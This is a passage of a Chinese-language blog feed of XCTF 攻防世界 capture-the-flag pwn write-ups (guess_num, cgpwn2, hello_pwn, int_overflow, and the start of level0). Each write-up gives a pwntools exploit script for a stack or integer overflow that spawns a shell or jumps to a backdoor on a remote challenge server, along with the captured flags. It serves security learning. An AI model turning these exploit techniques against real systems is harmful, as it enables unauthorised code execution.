<span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数，即:v6 = rand() % 6 + 1;</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./guess_num"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">49792</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 填充垃圾字符，并将seed覆盖为1</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 第一次输入，可随便输入</span>    srand<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 执行srand函数保证每次都能猜中</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{a1d36b526f5cc7080c63a2338ee0255b}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-guess_num7.png" alt="攻防世界-guess_num7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】cgpwn2</title>
      <link href="/posts/c034cefe.html"/>
      <url>/posts/c034cefe.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><strong>当程序中没有后门函数时，可以通过向段中写入 <code>&quot;/bin/sh&quot;</code>，然后通过栈溢出调用 <code>system()</code> 函数将写入的 <code>&quot;/bin/sh&quot;</code> 作为参数执行</strong></p></li><li><p><mark><strong>在调用 <code>system()</code> 函数时，若想要向其传入参数，注意填充 4 个字节的数据来平衡栈</strong></mark>，因为调用 <code>system()</code> 函数的时候要压入一个返回地址 <em>（直接写 <code>p32(0)</code> 也可以，这也是一个 4 字节的数据）</em></p></li></ul><hr><blockquote><p>为什么要填充 4 个字节？</p></blockquote><p>当程序调用 <code>system()</code> 函数时，会自动去寻找栈底，即 <code>ebp</code> 指向的位置，然后将 <code>ebp + 8</code> 字节的位置的数据当作函数的参数</p><p>如果想将 <code>/bin/sh</code> 作为 <code>system()</code> 函数的参数，就可以在栈溢出的时候，先修改 <code>eip</code> 为 <code>system()</code> 函数的地址，然后填充 4 个字节 的垃圾数据，再将 <code>/bin/sh</code> 的地址写入栈上，这样调用 <code>system()</code> 函数的时候，就可以将 <code>/bin/sh</code> 作为参数，然后返回一个 <code>shell</code></p><blockquote><p>为什么是在 <code>eip</code>（即 <code>system()</code> 函数地址）后面覆盖 4 个字节垃圾数据而不是前面提到的 8 个字节 ？</p></blockquote><p>因为当调用 <code>system()</code> 函数的时候，在 <code>system()</code> 函数中会首先执行 <code>push ebp</code> 指令，将 4 字节的 <code>ebp</code> 地址压入栈中，而此时的栈底距离参数 <code>/bin/sh</code> 正好 8 字节，所以应该填充 4 字节垃圾数据，这个垃圾数据将作为 <code>system()</code> 函数执行完后的返回地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2%200.png" alt="攻防世界-cgpwn2 0.png"></p><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/53c24fc5522e4a8ea2d9ad0577196b2f">【攻防世界】cgpwn2</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2%201.png" alt="攻防世界-cgpwn2 1.png"></p><p>32位 小端序，只开启了栈不可执行</p><p>尝试执行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2%202.png" alt="攻防世界-cgpwn2 2.png"></p><p>在 IDA 中分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2%203.png" alt="攻防世界-cgpwn2 3.png"></p><p>跟进 <code>hello()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2%204.png" alt="攻防世界-cgpwn2 4.png"></p><p>有两个输入：<code>name</code> 和 <code>s</code>，查看 <code>name</code> 的写入位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2%205.png" alt="攻防世界-cgpwn2 5.png"></p><p>发现<mark>输入的 <code>name</code> 是存储在 <code>.bss</code> 段上的，不是在栈中</mark></p><p>查看 <code>s</code> 的写入位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2%206.png" alt="攻防世界-cgpwn2 6.png"></p><p>可以通过 <code>gets()</code> 函数溢出函数返回值，转而执行其他函数</p><p>发现后门函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2%207.png" alt="攻防世界-cgpwn2 7.png"></p><p>但是这个函数只是执行 <code>echo hehehe</code>，即：打印 <code>hehehe</code>，并不能提供 flag</p><p><mark>既然输入的 <code>name</code> 可以往 <code>.bss</code> 段上写入数据，因此可以考虑通过 <code>name</code> 往 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code>，然后再通过输入 <code>s</code> 将栈溢出，使程序调用 <code>system()</code> 函数，再将事先写入的 <code>&quot;/bin/sh&quot;</code> 做为 <code>system()</code> 函数的参数，即可 PWN 掉程序</mark></p><p>就是需要注意：调用 <code>system()</code> 函数后需要需要填充 <strong>4 个字节</strong> 的垃圾数据来保持栈的平衡，因为调用 <code>system()</code> 函数的时候要压入一个返回地址，需要填充 <strong>4 个字节</strong></p><p>除了写 <code>b&#39;a&#39; * 4</code> 之外，还可以写 <code>p32(0)</code>，也可以代表 <strong>4 个字节</strong></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成elf对象</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取system函数的地址</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x0804A080</span>  <span class="token comment"># s在.bss段上写入的地址，地址可以在ida中查看到，要往这里写入“/bin/sh”，然后用system函数调用它</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./cgpwn2"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">65027</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 通过栈溢出调用system函数</span>    payload <span class="token operator">=</span> payload <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>  <span class="token comment"># 填充4个字节平衡栈，然后将写入“/bin/sh”的地址作为参数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"hello,you can leave some message here:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{d4336a51b8192c14138838a676822392}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cgpwn2%208.png" alt="攻防世界-cgpwn2 8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】hello_pwn</title>
      <link href="/posts/5760d96f.html"/>
      <url>/posts/5760d96f.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>基础的栈溢出漏洞</p></li><li><p>熟悉 exp 的编写</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/4f2f44c9471d4dc2b59768779e378282">【攻防世界】hello_pwn</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn1.png" alt="攻防世界-hello_pwn1.png"></p><p>64位 小端序，只开启了栈保护，没有金丝雀</p><p>尝试执行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn2.png" alt="攻防世界-hello_pwn2.png"></p><p>在 IDA 中分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn3.png" alt="攻防世界-hello_pwn3.png"></p><p>通过 <code>read()</code> 从命令行向 <code>unk_601068</code> 的地址处写入 0x10 个值，如果 <code>dword_60106C == 1853186401</code>，就执行 <code>sub_400686()</code> 函数，跟进：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn4.png" alt="攻防世界-hello_pwn4.png"></p><p><code>sub_400686()</code> 函数直接 <code>cat flag.txt</code></p><p>因此，只需要将 <code>dword_60106C</code> 的值设置为 1853186401 就可以得到 flag</p><p>查看 <code>dword_60106C</code> 存放的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn5.png" alt="攻防世界-hello_pwn5.png"></p><p>可以看到 <code>read()</code> 输入的值存放在 <code>unk_601068</code> 的地方就在 <code>dword_60106C</code> 的上方<br>而 <code>read()</code> 输入的长度为 0x10，因此只需在输入 <code>unk_601068</code> 时溢出修改 <code>dword_60106C</code> 的值即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span> <span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hello_pwn"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">58615</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x60106C</span> <span class="token operator">-</span> <span class="token number">0x601068</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{ff873b571a60849c4df0f263789a392c}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn6.png" alt="攻防世界-hello_pwn6.png"></p><p>执行了 <code>cat: flag.txt: 没有那个文件或目录</code>，说明本地已经 PWN 通</p><p>将 comtent 改为 0：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn7.png" alt="攻防世界-hello_pwn7.png"></p><p>获得 flag</p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】int_overflow</title>
      <link href="/posts/5360553d.html"/>
      <url>/posts/5360553d.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>原输入的栈无法溢出，通过 <code>strcpy</code> 复制操作进行溢出</mark></p></li><li><p><mark>注意参数的类型</mark>，例如 <code>unsigned __int8 v3</code>，<code>v3 = strlen(s)</code>，<code>v3</code> 是一个 <em>8 位 int 型</em> 数据，即使 <code>s</code> 的长度为 0x104，<code>v3</code> 也只能为 0x04（<strong>1字节 只能存放 2位 十六进制数</strong>）</p></li><li><p><mark>通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 可以直接往 payload 后面添加 b’a’ 一直填充至指定长度 0x104</mark></p></li><li><p><code>ljust()</code> 的 <code>l</code> 是让 payload 左对齐，往右侧添加字符，<strong>一直将原字符串填充到指定长度，而不是填充多少个字符</strong></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/51ed19eacdea43e3bd67217d08eb8a0e">【攻防世界】int_overflow</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow1.png" alt="攻防世界-int_overflow1.png"></p><p>32 位 小端序，只开启了栈不可执行</p><p>尝试执行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow2.png" alt="攻防世界-int_overflow2.png"></p><p>在 IDA 中分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow3.png" alt="攻防世界-int_overflow3.png"></p><p>跟进 <code>login()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow4.png" alt="攻防世界-int_overflow4.png"></p><p>有两个输入，查看数据 <code>s</code> 和 <code>buf</code> 在栈中的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow5.png" alt="攻防世界-int_overflow5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow6.png" alt="攻防世界-int_overflow6.png"></p><p><code>s</code> 在栈中的长度为 <code>0x28</code>，而输入的 <code>s</code> 长度为 <code>0x19</code>；<code>buf</code> 在栈中的长度为 <code>0x200</code>，而输入的 <code>buf</code> 长度为 <code>0x199</code></p><p>因此无法通过输入来进行溢出操作</p><p>跟进函数 <code>check_passwd(buf)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow7.png" alt="攻防世界-int_overflow7.png"></p><p>首先控制了 <code>v3</code> 长度要在 <code>4 ~ 8</code> 之间，然后将 <code>形参 s</code>（其实就是 <code>login()</code> 中的 <code>buf</code>）中存放的内容复制到 <code>dest</code> 中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow8.png" alt="攻防世界-int_overflow8.png"></p><p><mark>注意：这里的 <code>v3 = strlen(s)</code> 得到的并不是 <code>形参s</code> 的长度，因为 <code>v3</code> 的定义为 <code>unsigned __int8 v3</code>，即 <code>v3</code> 是一个<em>无符号的 8 位 int 型数据，也就是 1 字节，只能存放两位十六进制数</em></mark></p><p>即：<strong>当 buf 的长度为 261（0x105） 时，v3 &#x3D;&#x3D; 0x05</strong></p><p>在 IDA 左侧函数列表中，注意到一个后门函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow9.png" alt="攻防世界-int_overflow9.png"></p><p>肯定是需要修改函数返回值转而执行这个 <code>what_is_this()</code> 函数</p><p>发现在函数 <code>check_passwd(buf)</code> 中进行 <code>strcpy(dest, s)</code> 的复制操作时，虽然之前输入时 <code>buf</code> 无法进行溢出操作，但是通过 <code>strcpy()</code> 复制，可以利用 <code>buf</code> 将 <code>dest</code> 溢出，然后覆盖掉 <code>dest</code> 所在的栈中的返回值，这样就可以实现跳转了</p><p>但是想要执行复制操作，就必须先满足 <code>v3 &gt; 3u &amp;&amp; v3 &lt;= 8u</code> 的条件，即 <code>v3</code> 可以取值的范围是 <code>4~8</code>，也就是 <code>0x04~0x08</code><br>结合 <code>v3 = strlen(s)</code> 且输入的 <code>buf</code> 长度为 <code>0x199</code><br>可以得出满足条件的 <code>buf</code> 的长度应该为：<code>0x104~0x108</code></p><p>于是思路就很清晰了：</p><ol><li>首先输入 <code>&quot;1&quot;</code> 选择登录</li><li>由于 <code>login()</code> 中的 <code>s</code> 没有溢出点，在长度为 <code>0x28</code> 以内随便输入即可</li><li>由于 <code>login()</code> 中的 <code>buf</code> 在原本的栈中无法溢出，但是 <code>buf</code> 的值会复制到 <code>dest</code> 中，<code>dest</code> 是可以溢出的。根据 <code>dest</code> 所在的栈，要覆盖返回值需要先填充 <code>0x14 - 0x00 + 0x04</code> 个垃圾数据，然后加上 <code>what_is_this()</code> 函数的地址，函数的地址可以通过 <code>elf.symbols[&quot;what_is_this&quot;]</code> 获得</li><li>这样就保证了当 <code>buf</code> 的值复制到 <code>dest</code> 后，会转而执行后门函数 <code>what_is_this()</code> </li><li>但是，想要让复制操作执行，首先需要通过前面的 <code>if ( v3 &lt;= 3u || v3 &gt; 8u )</code> 语句，即：让 <code>v3 = strlen(s)</code> 的长度保持在 <code>0x04~0x08</code>，也就是 <code>buf</code> 的长度要保持在 <code>0x104~0x108</code></li><li>因此，除去前面为 <code>buf</code> 构造 <code>payload</code> 所用的 <code>b&#39;a&#39; * (0x14 - 0x00 + 0x04) + p32(elf.symbols[&quot;what_is_this&quot;])</code> 以外，还要在后面继续填充垃圾字符，让 <code>buf</code> 的长度在 <code>0x104~0x108</code> 之间</li><li>通过 <code>payload.ljust(0x104, b&#39;a&#39;)</code> 即可实现在 <code>payload</code> 右边添加 <code>b&#39;a&#39;</code> 一直将 <code>payload</code> 的长度填充至 <code>0x104</code></li></ol><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./int_overflow"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"what_is_this"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./int_overflow"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56322</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x14</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x04</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment"># 溢出dest，使其跳转至what_is_this函数</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x104</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 原payload左对齐，往payload右侧填充b'a'，一直填充到payload的长度为0x104</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your username:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your passwd:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>cyberpeace{25686bc91ab84046b5a18aaa66041868}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int_overflow10.png" alt="攻防世界-int_overflow10.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】level0</title>
      <link href="/posts/ad530427.html"/>
      <url>/posts/ad530427.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>经典栈溢出漏洞</p></li><li><p><mark>64 位修改函数跳转地址</mark></p></li><li><p><mark>64 位程序堆栈平衡问题</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/291721f42a044f50a2aead748d539df0">【攻防世界】level0</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看文件信息：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%201.png" alt="攻防世界-level0 1.png"></p><p>尝试执行文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%202.png" alt="攻防世界-level0 2.png"></p><p>在 IDA 中分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%203.png" alt="攻防世界-level0 3.png"></p><p>首先通过 <code>write()</code> 输出 <code>Hello, World\n</code>，然后执行 <code>vulnerable_function()</code>，跟进：</p><p><img 